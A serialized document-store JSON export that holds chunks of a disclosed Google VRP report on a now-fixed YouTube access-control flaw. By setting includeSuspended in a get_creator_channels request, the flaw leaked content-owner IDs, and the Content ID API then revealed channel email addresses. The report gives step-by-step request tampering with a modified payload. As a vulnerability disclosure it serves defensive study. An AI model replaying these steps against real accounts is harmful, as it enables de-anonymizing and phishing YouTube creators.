"a5c2fbe74b0463c897438e9b1ec1c3a5eb3ab82a68d4ecbc2aedb1b15a9b8796", "ref_doc_id": "2e5d3d56-8713-4da4-8a37-f6c133ea36fd"}, "a8852d4c-2584-4bf0-8b2b-48e4ee4d2862": {"doc_hash": "467b57bcad3dd12a192342d77261550892cd6e289e5b350954698e58ffdf8a09", "ref_doc_id": "2e5d3d56-8713-4da4-8a37-f6c133ea36fd"}, "da5bf6c8-a0a5-4774-a149-a202702d3241": {"doc_hash": "12f8942413e044967a1ba077bd66854bcf305562f11355b4200ee33619e9700c", "ref_doc_id": "8e40cee6-dfe9-43ba-9f52-2a2623d4d260"}, "63f08283-a108-4a28-8561-b63a134a838d": {"doc_hash": "a5d5c94a626e76a627f945496f79b452f5a1a9f481bc8a714cff2e840a49a380", "ref_doc_id": "afd23465-f5dd-43b9-9a17-e686ec676e2d"}, "faf3ff2b-7228-46b3-9d18-d6c2c572847b": {"doc_hash": "3a8f489a450fff4952cbc410e539b5c4ed8f7c327e84ac26dce67c6aae880f5a", "ref_doc_id": "0493ef12-67e1-4a8f-9468-6dadf00952f7"}, "40e78730-9b1b-4692-8176-10c29d73a752": {"doc_hash": "28b417b5497d6f848b78e623a53027edf351f600a5d5eceda2bc011dfdf9a89d", "ref_doc_id": "09c17b06-50ed-432e-9de9-6f0cc2e7f266"}, "15a27b97-7ee0-4b90-858e-9172ad576c9d": {"doc_hash": "05b6c1b0efb07678797283d99bf1c5b14e60c9c2af4204f95334fd1c95eef368", "ref_doc_id": "cadbfe77-a339-47bb-ab5c-109fe72446a4"}, "03cda080-7826-4834-a202-7f40db974064": {"doc_hash": "247e2a007cae7e14a3df9d368167e5e596f2f0470bd98b900e4ee77ff1c3d037", "ref_doc_id": "39f1d7be-f5a2-494a-a4ce-a9c7ce1dcbaa"}, "27e36b2e-ad43-4f87-b620-42ef3224d165": {"doc_hash": "06c567ce3d4b27f8a473d7a5587459c8a1dec1826db5518711be976b1e0aaedf", "ref_doc_id": "38587683-fd88-4a06-b939-12ecc3292756"}, "a6c0f852-9d77-4ff1-a0c4-cba7edca45ff": {"doc_hash": "4a86d8ef0c7b3275a29d971695e8232d3b87d95e6c31c217aa608b2990431e88", "ref_doc_id": "b29dd12b-ac36-4849-a589-d982c69f2e54"}, "ad9a1d74-ac20-4905-a268-e282446dd4a2": {"doc_hash": "73c0418b39da7ffba86d6219e564fd7aa22faa36d621c2e16af757da00a80dc1", "ref_doc_id": "bce25272-be39-4144-8a0e-18bea5d0d26a"}, "d0024ff1-3400-4ef4-b1b2-18ffa3645a83": {"doc_hash": "70178de0b07d4f9ec7a4d55080af495da236481d5493ec726837e59ce4933db1", "ref_doc_id": "e0bab84e-7eb7-4528-bb30-c221fa04943e"}, "32893812-9a19-437a-b858-f245cde8b1ac": {"doc_hash": "9b24e6c41d7f46ca738b9687a9c27dc8092ed9c8696786370206e522ba71d1f7", "ref_doc_id": "e0bab84e-7eb7-4528-bb30-c221fa04943e"}, "c7b43810-5275-4cee-881f-b5365fa1a8ea": {"doc_hash": "81322cd5f44caaa83f69a8f3af4e2df6f04b602c52b4a0a855e39fb2b9c2019f", "ref_doc_id": "85c7d974-4f34-409d-9413-14876b261862"}, "4deac1d5-ee44-4a7c-a3f0-396ef522b1f9": {"doc_hash": "76b2c4bb56bb1dead22a90c20b29b6cb042524c60ebb04146362cb24bea282a1", "ref_doc_id": "200abcf2-499b-4399-854f-90b45c2d1d8e"}, "4e8ca7df-acb2-4a07-8aef-267fa5a13ec9": {"doc_hash": "7dad5cf72b3dcaa1cff591656ae66dffa6b6743a4a24069423b83b6cbafa7a72", "ref_doc_id": "dcedcb07-81eb-48ac-be26-c4306235bcc5"}, "ad8e3bb9-c166-439b-a0d3-77e0d3bcde93": {"doc_hash": "3c8102ce5b3ed01469f5802dd669fc15f320601e52eaee4fee8d4990c03f0d9c", "ref_doc_id": "998f8e67-bbac-431d-b9fb-9051d14942c5"}, "08c42fda-a4e9-4115-9e15-24ceb5c4d306": {"doc_hash": "f289d9942bc42bdef1287587e8f9243c41ee99d3a672c1b727a40bab01db5edf", "ref_doc_id": "6d9f9102-220a-4af6-be46-11a5bc55862e"}, "c95c830e-beca-49ff-8797-9692ad9b9a55": {"doc_hash": "71fa1205a517b3854f8a67a89f7103f0d15afe5a7e4186696f3ce8ecdc65f273", "ref_doc_id": "0dc93e74-dfba-4895-bb49-11456d0ce588"}, "bbf64eb9-9eac-4412-b921-18190925ac5b": {"doc_hash": "30348221540e143a84e0b81cfa9b8c5ae999b113cbb1af102426ba2d0c121739", "ref_doc_id": "04da8b49-a510-491c-a053-2501078bc14e"}, "a5ffed9c-cfb2-460f-8c9d-3c14d076372a": {"doc_hash": "b3d11f7cbbc5d52dc886650bcbef130b9f0b0a06e02141bfdd9e719dd442d3cc", "ref_doc_id": "60331ddf-282c-4bd4-ae68-4dd1451744ec"}, "06424996-b1ac-4c0d-b40c-f534091627e1": {"doc_hash": "8f45e10c1adf6b3aa2bf3d1d219f97171e2a194524e139ca1b6eb697685ff5af", "ref_doc_id": "e2c3f840-0027-4087-b626-b5cba276ee36"}, "dbc01a1c-14b5-47cf-bf7e-50cbda74b508": {"doc_hash": "338d371465812f333069bbd3bada8a0fb643ca2dc51ed0d1b93d971ad049c008", "ref_doc_id": "8ff052df-7d7a-45ed-91ef-768182061d90"}, "cccc1ed8-662a-47a4-99e3-00c7c507f0a0": {"doc_hash": "5bbe4f5ef1611abda70aa34ff613e9392e0d618d9b76b0ce0239f7c125a0e1bd", "ref_doc_id": "c576ce7e-3964-4f1d-9e2b-d0fe49206e29"}, "74aeb6fc-3544-4aa2-a2b6-2db9a9123e0f": {"doc_hash": "3c396d11efe4626b71b13957a7bf632656b27dd0be25e369f86660616b31e998", "ref_doc_id": "c576ce7e-3964-4f1d-9e2b-d0fe49206e29"}, "a9d60b90-02c0-4f27-b912-6618c0c22347": {"doc_hash": "63caeb7692160ef55d905d8ab11941a4179e0c847a252953781f3b576fc6b963", "ref_doc_id": "c2f52a08-3a45-4a12-8195-1f7c53a97218"}, "54056b29-b815-4ee9-8b29-54d5af090a7e": {"doc_hash": "46018c9fc15d3ee348a130edf894144abc6fac51fc27b8e282cee8075800d009", "ref_doc_id": "e19ac637-8e24-4ab9-9afe-8e5d584ab8e9"}, "7ebfaa9a-a382-465b-932d-b5458040916a": {"doc_hash": "a40bec6866a5df6afdf5e2b26db588391d7723c5e16bda0630e19173a58a4065", "ref_doc_id": "32b91961-1b02-47a8-a0e4-7cc0d97ae9cb"}, "8a3821f3-59df-4c3a-900a-2129ef70bd23": {"doc_hash": "59f35b505fc625eb3d905da57b723258f52a1e89c9ca73a22e62c5b3de0f0bad", "ref_doc_id": "76586415-d2e3-45d2-99cb-591343257a9b"}, "795fe966-dd5a-4152-a5d6-343b0e4132a8": {"doc_hash": "2235503d329277f49d3ddafc27876e1dc597cc70bff48e61a5410ca58feb4b24", "ref_doc_id": "19c24b66-7930-4b0d-9a25-675f456a12af"}, "cadbc57a-93f4-4cd9-9a76-6a1127e2fa98": {"doc_hash": "6c0aa0f86dd3365e12dd5b37cb32924ab1c0a962c953cfa881f69d3a039ee77c", "ref_doc_id": "4d5f39d2-9fa1-4eca-908e-fc60439e82db"}, "73fb7e11-2bbd-4700-9124-0b9d1d7d5286": {"doc_hash": "e353e8dbda785f2190ce8e693d5db8ebc8467f19c7626a9abfea5f01e8a48202", "ref_doc_id": "10302f49-b5f3-4cf9-98c5-4053480ceb40"}, "fbbe56e6-d48b-437c-ab7a-f8cc3e4ac50e": {"doc_hash": "8398a9318614aeaa666b52672868b7826a8838caedf0386c96775db960d131f1", "ref_doc_id": "8a6a6c05-cb44-4f6c-b883-781c6bdb6173"}, "fcf77fdc-5941-4e5f-8224-4b9c326683a5": {"doc_hash": "a7fd43f401a7f1eef649eb625d8baa1e8163dddd87243377dc747b165c8b7c2e", "ref_doc_id": "82a6cdae-f7c5-4cba-912a-27dd6a957fff"}, "96a679f4-bc53-4b53-9730-a8b354a5fa7b": {"doc_hash": "bd058db289afc55b30739c4b1f3e906b3790e327957ef508f7010f37684bfbf4", "ref_doc_id": "6966d56d-9de7-4eb3-a604-b171afe00f6c"}, "67713d80-8fbd-4a2b-846c-7d07831a324a": {"doc_hash": "59687a9244d903f539017ab427ab9d84664a7b03153217fdffb267468e3b5065", "ref_doc_id": "d0dc3f8a-98cb-4f10-b33c-93ab92d95dbe"}, "c9713caf-7ac6-462d-ab32-69892219dc5a": {"doc_hash": "da9ed8c0cdc50d7ba7dd05c9203189dd6d9f198c0bb7a99ee30074dc891c2255", "ref_doc_id": "f679cce1-0d1f-4e14-a9cc-a3c5eb6a205b"}, "f1df7e76-9b81-4eff-9cea-0c0e7efabd32": {"doc_hash": "231dc3606954b6ac2845f05a82afdf543fbf5c2de1131e2f0174317eab91c207", "ref_doc_id": "b2672711-e716-48bc-a25c-dd71e0455c29"}, "45a4aec0-1394-4489-a4b2-f504b4846085": {"doc_hash": "775769f857c1b07cbbc7067851ebb6c843c0629d5f375d1133925973efc8d5fe", "ref_doc_id": "7ad6a982-52a2-484d-90b4-9f4a398084ff"}, "26eca0da-e48d-4b4f-92be-c38e2041767d": {"doc_hash": "cf64d6340ee968f2601962586463fdfc56d902cc437ba8af1ce7bd38166b5491", "ref_doc_id": "a725a72b-3602-4e55-b12f-4f7fcf3172a8"}, "33af227e-e206-4028-ab0e-d3cbbe376b90": {"doc_hash": "e916202f2e2ac760b364a66fa4a5d162c82ff066bd3335c7d79722a9edab1b2f", "ref_doc_id": "68a326f2-17e9-418c-98ba-8e509ecc52b6"}, "8ef55d67-62f4-4e2d-8069-fe5273630b68": {"doc_hash": "92c345d58523e86fec639e8b1435de1d9adb11ff74fc70a98273d57803f1d8af", "ref_doc_id": "6509e95e-6685-4525-8f38-0ccfdae41fe3"}, "a8994e4b-f0a4-4f78-bf5b-5ca28cdaa25b": {"doc_hash": "9bf8396cea95226c5b28ce01007cfa6ec9f3dc1a2a338cd26763c62513c8eb00", "ref_doc_id": "3eda2b51-7e17-4304-8074-2711dcc853b5"}, "25587ad1-5990-4f01-ab6e-38d8c3e24ed4": {"doc_hash": "5e67edfdc2609f629313c980ca10d0afe1632494480dca28fbd14a09fe7c0b61", "ref_doc_id": "9f9916b2-c6c0-469e-8990-2c9ef720981b"}, "45fdcec5-4853-4b0f-9788-712b9e9d8a53": {"doc_hash": "07fac26342e51a33f341e6247fedae88ba6c893efbb264fd95bf7a1c62104c11", "ref_doc_id": "3d57880b-67e9-4159-b211-c3b8e4eafe23"}, "4be3a1a1-6ae6-47b6-b048-dc771f0b1895": {"doc_hash": "b063e0c767fb07822a294ac953bd4615a6fe95647f0f0af5f1b34df71f09e5f0", "ref_doc_id": "c3a11a58-224e-4411-a391-c2743e4ba937"}, "9e18868d-6d96-4f99-8a27-735b66ee7f2d": {"doc_hash": "55cc948ecc2a759049bfa23a0c218437c3e60398299a3d73fb02e01266bf4d22", "ref_doc_id": "d17ba352-18c1-4255-bb81-1e691542e20a"}, "297b1001-62db-45c2-b061-872aa7777136": {"doc_hash": "6ae0660d184b5df8613fa17ee81abc51b0e45a28d7ddf9f9c76ebc9330a019d7", "ref_doc_id": "5d4a87fe-1111-4623-98e4-3cbc7324a13e"}, "515f5045-3502-4b85-893f-a294f931d188": {"doc_hash": "b542017cd1819add03aaef1086648dc8ec826a5434ec056c98ba25ec6a254ec0", "ref_doc_id": "406ede81-16f6-4035-a1bc-a13bea2cf843"}, "e011446b-623d-4df5-82a2-105fe9fcc010": {"doc_hash": "33687d86b8c12817f4bab23a813a8ddde166a390b243ba3d6c7b407e3105c0e3", "ref_doc_id": "ccbca342-30a8-40f5-95b1-5312b5c4d20b"}, "f3a5baf0-ac27-455c-8992-ed57bf857da6": {"doc_hash": "fe5a7e6d4fc42430abc1c7b802e7fcad3b1ee83653aee9b6e77fdb6a865efefe", "ref_doc_id": "e8025ce9-df34-4037-b000-dd1f7a3b1139"}, "560e22f2-bce4-4c91-bacb-eb0c8fe84eba": {"doc_hash": "6e1aca0c9a78ab990b9c18ff651dc9d784fa68124d8a18260ada9c47dc9a045f", "ref_doc_id": "e8025ce9-df34-4037-b000-dd1f7a3b1139"}, "ea95c5be-eb99-4713-aa51-ebfb0a4132e5": {"doc_hash": "e5275fe72c78c62c8867403f5382339e71207d5669457c237e44ae7ecda9ae90", "ref_doc_id": "f591bc8d-81cf-40cc-b244-14ee0a71a929"}, "4f8b7897-4174-4bce-b883-51d6ed08d4e9": {"doc_hash": "e10fc63a19dbcf7237172f05a7a232f4e27a7c201bcbe5731438b37f016256f5", "ref_doc_id": "91d451d9-dbcd-4726-9c4e-61fdc528a654"}, "f3a8e044-e7dd-4fe3-a6c0-d204a62b5ca7": {"doc_hash": "bff8358bfc4b771cd1189a8cfb801a5d3cfbd77b37332e9ab2f8c0c6b2662aa0", "ref_doc_id": "89e3ffb3-8ca1-42e7-9a0c-a0814024c1e4"}, "4e356059-6b68-4d48-99b8-a0c297e786da": {"doc_hash": "2828c8fba6a36b24a988d4cd2af65120981d4ce548ceb33be8d022ae822cb831", "ref_doc_id": "bff45020-2884-4541-a325-5865a192e7e3"}, "a146f45d-73c3-4a49-b558-d1cb47d03bcb": {"doc_hash": "841b29556455d38ff8fd72029c53b17291da5a1831155069ad2f064cd0fff582", "ref_doc_id": "bff45020-2884-4541-a325-5865a192e7e3"}, "e318e902-c827-48b9-a4c1-187b4fac1541": {"doc_hash": "bb78cfb14a24f6784d8041065947af370c0588baecc0d99286cc8a2239dcdb2b", "ref_doc_id": "752e327f-2c13-483b-935a-33135d032139"}, "b124fef2-8ad3-4b77-87d3-ab633da63d92": {"doc_hash": "7a658906348290243447eeb45f6bfea472eae473c40608a67735f104bdbeddfe", "ref_doc_id": "ced43e07-df1b-4fee-8f76-5456553cfee5"}, "30392187-b0bf-4145-844b-7c909df725db": {"doc_hash": "1c24c00726a66aa3714a783d6132dbe1976c4d267fe2725dae62497a35cdc08d", "ref_doc_id": "b07dc340-c0c5-4747-a58d-a102f6c7acc3"}, "46b625e7-6999-4cc6-9127-d8ae1d97e378": {"doc_hash": "497afb01f5a8e5803210540df132d25a1f3eb1366891bd8965b2ba3b139127b4", "ref_doc_id": "5235e34c-35db-4f64-acf7-aa8564dde543"}, "0dbcbcac-edf9-4cf4-9371-aa6953a47bb4": {"doc_hash": "2f171fb1736eb7d6d3a5b3a191f22c81e8cb92e58ea99b02c5a2f48dade15cbb", "ref_doc_id": "74fd59a7-b3cc-43c8-926d-965cd09fbc3d"}, "cc998590-070b-4c5c-9ee3-c6a84b9306aa": {"doc_hash": "f9b59bc42262e1d66668f4279a66294959e7e6687138ba4fcae9ac3e75f2205f", "ref_doc_id": "eaebb43a-59ca-440e-bb27-3b81e4ab511e"}, "13389175-86a7-4283-80b6-6452d57c5c61": {"doc_hash": "9b3c701c49bb0267e9dc4f801481fc6baa1b083a8b2398bd057719267f70ebb1", "ref_doc_id": "a79abfa5-369b-46f6-853d-579bf5421b5d"}, "874f84c6-d7df-4ee3-bfcb-fecfcbbcd1a5": {"doc_hash": "5e038e9841e0efad46dc6499845bd089a64f0f4a6a10750b0be0dff1c8eed0f2", "ref_doc_id": "93d9dda4-c808-4339-9ac9-4e195441b1a0"}, "459e93ca-c3e2-4f5c-a911-70e0d7532f8e": {"doc_hash": "017c5a358a34f4c5278dd7d00ec7f20bf22a51dd84635b9ab13a4396e1a3816a", "ref_doc_id": "4fdf6083-baf2-439f-9086-a0d64c8a8094"}, "384f11b0-c10b-4e1b-9d1f-2f2cc1b02c99": {"doc_hash": "750ee8cf4bc7f682825d1952d3af1f04fb359f7bdfcf27401a9bfbefa7c72cc8", "ref_doc_id": "040a8228-9f17-4c50-af1d-1fa0c601d4c5"}, "45bf5799-3266-49cd-9a8f-8324e17952d9": {"doc_hash": "b957974825c8800dbf13717eb681f68e92028bf22c11e6866dd5178a451e2400", "ref_doc_id": "ec251bbe-b391-4979-8feb-7e797b1e8445"}, "4f010a24-7eca-4fa3-a21f-9c7278baca20": {"doc_hash": "be077329a16875c72c6ccb2d9eee0bf2bbe204d9c2531d7c8ec044489b466e44", "ref_doc_id": "54470bbd-d301-4efa-85f7-118ed3e0b1fc"}, "8bd8b5f9-6a43-4edc-a180-5ee2ce6fdc70": {"doc_hash": "5a35086e481fa2b429f606131189ace2d43a8ddb80f450f627fca16414986692", "ref_doc_id": "70154f66-d455-4389-b281-1ad3dbaed4db"}, "0abb049a-adb6-4d97-8704-0b9c0e53940c": {"doc_hash": "8933855f1f22de2c01e73d8ba45bc25d90242036b6d2c48bf68eea49f2aeb805", "ref_doc_id": "6fc335f5-99fb-4dea-b53c-d9e638772efd"}, "e1615abc-b123-4737-af6f-30bfba8262b2": {"doc_hash": "4ceeb4689e2a4ab55a67358a37c0ecfb48d8d832a0a95dd711fc56dca837dca7", "ref_doc_id": "f9bd4c02-0b26-43a8-bbe2-3d19457d3803"}, "cc478652-75b0-4fb3-88db-86d0a1c5cfee": {"doc_hash": "5ac81defe22a21932149f69d79ff7926283b4a57aff88e34f9a7b28eb0c5afb6", "ref_doc_id": "e48968b8-5520-41c0-88b0-81e078df740e"}, "6bb31a68-66a7-4ea8-8c7e-8d6feaa98980": {"doc_hash": "2aefd5b6fc0c4faf5bdb6701137fb4cd0081c3b73b010ddc9b5e5ed08a6a20ad", "ref_doc_id": "16bb39a7-c794-4fed-a457-54a7d57858b2"}, "01a27fd4-d864-4b12-9216-2bd12b2a7092": {"doc_hash": "e234a8702695eadbc0407a7e7ead90c22fd82f39683805ec5d718aca935afa27", "ref_doc_id": "cca3e6f0-0eab-4499-a295-398b7fddc898"}, "691efd08-5dc9-4a65-8224-b47fd03757a5": {"doc_hash": "4f9fa718951082c6dca81e62277b752456cac1a4bfc23df21df4e05665e425ff", "ref_doc_id": "515a14af-2f83-4fd2-94db-5b2f45552c80"}, "5b2fddbf-0e6f-40a9-a7d4-3ef28a61df16": {"doc_hash": "fa36d15aba5f7ac8d1a87c747d1e5357119d549e15405e03e878085b18feb4b5", "ref_doc_id": "429e5a9e-f193-49eb-8a6f-9891ba90c94f"}, "c9ad628d-fc37-4b48-b6bb-5a9f6cf43880": {"doc_hash": "ce662f39d67ebaef21635d9313e5a705a37b15ab9d86bf76a13e389e1b676adf", "ref_doc_id": "c977429e-9ff4-447a-9579-fbcd3b66aee3"}, "7912be38-fbb7-4550-a247-22394fa545b9": {"doc_hash": "ffeb7087583c857a95f0c9f5c1f41c57a5c570385df8a2aea2b37f97db691faa", "ref_doc_id": "b5197005-4e01-4bc3-b3cf-67fb4fbb9cb5"}, "55301459-8c97-4114-a08f-ee6548454ec2": {"doc_hash": "bf4868b51e646eead29d1e997d53ca1ee8911dc726500372f06a69189f7d8d73", "ref_doc_id": "314774b2-2445-46f2-a948-3bcffe227cc9"}, "ef6e7f81-cee3-4830-8259-cf9763420e74": {"doc_hash": "ce264cc4c90359c1b766a266efa9ee13265c68b4f54bf1c1292bad73698da075", "ref_doc_id": "c57bf029-dd98-4f3b-bc14-9f2a3d33faed"}, "d5f23ad1-8cab-4cf4-a870-40f66a2fc906": {"doc_hash": "29c164941f9ee17b3a552e858d1a6ddf799c6b64f373258d227681c3e372d7e9", "ref_doc_id": "a7ee91ba-dbb2-44b7-97ab-c85c23d52d5f"}, "9ad33a76-0035-4a68-bedc-ff0266a17f31": {"doc_hash": "3c3c7a298935ffd92563299251a246228e0608c617ffdfcea2037ed7133f20fa", "ref_doc_id": "c3d07fd0-5ae9-4e73-952e-847bec0f3c38"}, "752b0f82-ca3a-4cae-915c-cdad89dad441": {"doc_hash": "cc37e7526aa57d3c127cec031dc975734c0fc71758f2ddda4a5d4d845b4147c0", "ref_doc_id": "3f02949b-80f4-4e11-bd48-794677a70cc6"}, "47fd4883-cef5-4676-9ca3-766841e93699": {"doc_hash": "3116e49d16db59d3ec56cc78171d096d4fc614fe0378e1d48b47ba2dd6572cc9", "ref_doc_id": "3f02949b-80f4-4e11-bd48-794677a70cc6"}, "73e58829-83b2-4c76-8f74-ec3007785426": {"doc_hash": "2bdb21d0f8b34d4dfe548a09d7a3460618ca313a22488b477cdeedea3faee242", "ref_doc_id": "3f02949b-80f4-4e11-bd48-794677a70cc6"}, "39538dd2-085f-4446-85d6-c858a1ecd839": {"doc_hash": "0c9d96602aa15a1e7337f7a30cf4fd5baba65a22f68b57fa2df9bcf637fe8730", "ref_doc_id": "ed657c46-fb17-49ce-9b23-eeee031501af"}, "97a5a656-8968-4180-b5c9-aea94f144a70": {"doc_hash": "4f0be0bda8bb69016e6b17f5e47a12270f1c938d3aff89c8a8c644f838988d0c", "ref_doc_id": "ab250304-7c84-483a-8cd9-7e4a402e447d"}, "010c9a5e-9ad3-4e58-91d9-92cb4123c8bc": {"doc_hash": "7df4dc96b6117f6f70996d06b35db53a70ac060eb10d9703ace7e4771c6b63d1", "ref_doc_id": "014117e7-2295-456b-bc27-13fb2cbb98bc"}}, "docstore/data": {"7dbd0a2d-0342-4ea2-8957-ae2c159d5a94": {"__data__": {"id_": "7dbd0a2d-0342-4ea2-8957-ae2c159d5a94", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_641657.txt", "file_name": "20250408_172348_641657.txt", "file_type": "text/plain", "file_size": 5244, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "059dcf25-e5bb-4c79-bd00-be2883db5d71", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_641657.txt", "file_name": "20250408_172348_641657.txt", "file_type": "text/plain", "file_size": 5244, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "599d7a13207c550fd2e90fb175c2381f8194b6c9f1e5d28d8e5b644cc6c00e34", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "68f97c13-9ed6-4d2e-98ae-97db122266ff", "node_type": "1", "metadata": {}, "hash": "86e65e6310c89f140b8899d2f76f79e2e34c10d34b54fdd267fa307b15da10ed", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAccess control issue in /get_creator_channels leaks channel contentOwnerAssociation, which leads to channel email address disclosure via Content ID API\r\nReported by:\r\nbrutecat\r\nGoogle VRP\r\ntriaged\r\n04:08 | Dec 17, 2024\r\naccepted\r\n06:03 | Dec 18, 2024\r\nfixed\r\n16:16 | Feb 21, 2025\r\nreward decided\r\n$20,000\r\nSummary:\r\nAccess control issue in /get_creator_channels leaks channel contentOwnerAssociation, which leads to channel email address disclosure via Content ID API\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://www.youtube.com\r\nVulnerability type:\r\nPermissions Bypass\r\nDetails\r\nSummary:\r\nAccess control bug in\r\nstudio.youtube.com/youtubei/v1/creator/get_creator_channels\r\nleaks a channel's associated\r\ncontentOwnerId\r\n. This\r\ncontentOwnerId\r\ncan then be used in the\r\nContent ID API\r\nvia\r\ncontentOwners.list\r\nto leak the channel's email address at the time it joined the YouTube Partner Program.\r\nImpact:\r\nThe disclosure of the email address of channels in the YouTube Partner Program (YPP), including timestamps on when they first joined and last joined YPP.\r\nCore Issues\r\nThe\r\ncontentOwnerAssociation\r\nof a channel is leaked from\r\nincludeSuspended: true\r\nEven though the YouTube Content ID API is only supposed to be accessible by users with a Content Manager account, it's possible to use the API authenticated with a Google account that was tied to a channel during the time the channel joined the YouTube Partner Program\r\nPre-requisites\r\nAccess to a Google account that was tied to a channel during the time the channel join the YouTube Partner Program (required to leak the email address with a\r\ncontentOwnerId\r\n)\r\nSteps to reproduce:\r\nSign into a Google account with a YouTube channel\r\nVisit\r\nhttps://studio.youtube.com\r\nOpen DevTools > Network\r\nClick the \"Earn\" tab on the YouTube Studio\r\nA request to\r\nPOST /youtubei/v1/creator/get_creator_channels?alt=json\r\nshould be seen\r\nModify the request payload to this request to look as such:\r\n{\r\n  \"context\": {\r\n    ...\r\n  },\r\n  \"channelIds\": [\r\n    \"[REDACTED_ID]\"\r\n  ],\r\n  \"mask\": {\r\n    \"channelId\": true,\r\n    \"title\": true\r\n  },\r\n  \"includeSuspended\": true\r\n}\r\nReplace the channel ID in\r\nchannelIds\r\nwith your victim channel ID.\r\nNote,\r\ncontentOwnerAssociation\r\nshould not be in the\r\nmask\r\neven though this is what we are leaking. This is because there's a correct access control check  on the mask, but\r\nincludeSuspended: true\r\noverrides the response data to include the\r\ncontentOwnerAssociation\r\neven if we aren't authorized to view it.\r\nSend the request and the response should look as such:\r\n{\r\n...\r\n \"channels\": [\r\n    {\r\n      \"channelId\": \"[REDACTED_ID]\",\r\n      \"title\": \"[REDACTED_TITLE]\",\r\n      \"responseStatus\": {\r\n        \"statusCode\": \"CREATOR_ENTITY_STATUS_OK\"\r\n      },\r\n      \"contentOwnerAssociation\": {\r\n        \"externalContentOwnerId\": \"[REDACTED_ID]\",\r\n        \"createTime\": {\r\n          \"seconds\": \"1362270100\"\r\n        },\r\n        \"permissions\": {\r\n          \"canWebClaim\": true,\r\n          \"canViewRevenue\": true,\r\n          \"canEnableCid\": false\r\n        },\r\n        \"isDefaultChannel\": true,\r\n        \"activateTime\": {\r\n          \"seconds\": \"1637070104\",\r\n          \"nanos\": 959438638\r\n        }\r\n      }\r\n    }\r\n  ]\r\n}\r\nThe target's content owner ID is\r\n[REDACTED_ID]\r\n, the unix timestamp they first joined YouTube Partner Program (YPP) is\r\n1362270100\r\nand they last joined at\r\n1637070104\r\nFor channels in a Content Manager (CMS), the\r\npermissions\r\nwould be the permissions granted to the channel by the Content Manager.\r\nSign into a Google account that was tied with a channel when a channel first joined the YouTube Partner Program\r\nIf necessary, you can refer to the attached video for the following steps\r\nVisit\r\nhttps://developers.google.com/youtube/partner/reference/rest/v1/contentOwners/list\r\nClick \"Try it!\" on the Explorer on the right side. Enter the\r\ncontentOwnerId\r\nin the\r\nid\r\nbox. Ensure that Google OAuth 2.0 is checked.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3967, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "68f97c13-9ed6-4d2e-98ae-97db122266ff": {"__data__": {"id_": "68f97c13-9ed6-4d2e-98ae-97db122266ff", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_641657.txt", "file_name": "20250408_172348_641657.txt", "file_type": "text/plain", "file_size": 5244, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "059dcf25-e5bb-4c79-bd00-be2883db5d71", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_641657.txt", "file_name": "20250408_172348_641657.txt", "file_type": "text/plain", "file_size": 5244, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "599d7a13207c550fd2e90fb175c2381f8194b6c9f1e5d28d8e5b644cc6c00e34", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "7dbd0a2d-0342-4ea2-8957-ae2c159d5a94", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_641657.txt", "file_name": "20250408_172348_641657.txt", "file_type": "text/plain", "file_size": 5244, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "2112b747430e3e061b341a4c4043dfde2d07f896ae177b0b9d76884cf777b207", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Sign into a Google account that was tied with a channel when a channel first joined the YouTube Partner Program\r\nIf necessary, you can refer to the attached video for the following steps\r\nVisit\r\nhttps://developers.google.com/youtube/partner/reference/rest/v1/contentOwners/list\r\nClick \"Try it!\" on the Explorer on the right side. Enter the\r\ncontentOwnerId\r\nin the\r\nid\r\nbox. Ensure that Google OAuth 2.0 is checked.\r\nClick \"Execute\", and you would have the target's email address:\r\n{\r\n\"kind\": \"youtubePartner#contentOwner\",\r\n\"items\": [\r\n   {\r\n     \"kind\": \"youtubePartner#contentOwner\",\r\n     \"id\": \"[REDACTED_ID]\",\r\n     \"displayName\": \"[REDACTED_USERNAME]\",\r\n     \"conflictNotificationEmail\": \"[REDACTED_EMAIL]\"\r\n   }\r\n ]\r\n}\r\nThe\r\ndisplayName\r\nis the channel's display name at the time it was monetized.\r\nAdditional notes:\r\nWhile it may initially sound intentional due to the use of the name\r\npartner\r\n, channels in the YouTube Partner Program (YPP) are not supposed to be able to use the Content ID API. This is why the option to enable the Content ID API for a project in\r\nhttps://cloud.google.com\r\ndoesn't show for Google accounts tied to a YPP channel. However, for whatever reason, the endpoint still works via the \"Try it!\" functionality of the API explorer.\r\nAttack scenario\r\nAn attacker with access to a Google account that had a channel that joined the YouTube Partner Program (over 3 million channels) can obtain the email address as well as monetization details of any other channel in the YouTube Partner Program. The attacker can use this to de-anonymize a YouTuber (as there is an expectation of pseudo-anonymity in YouTube), or phish 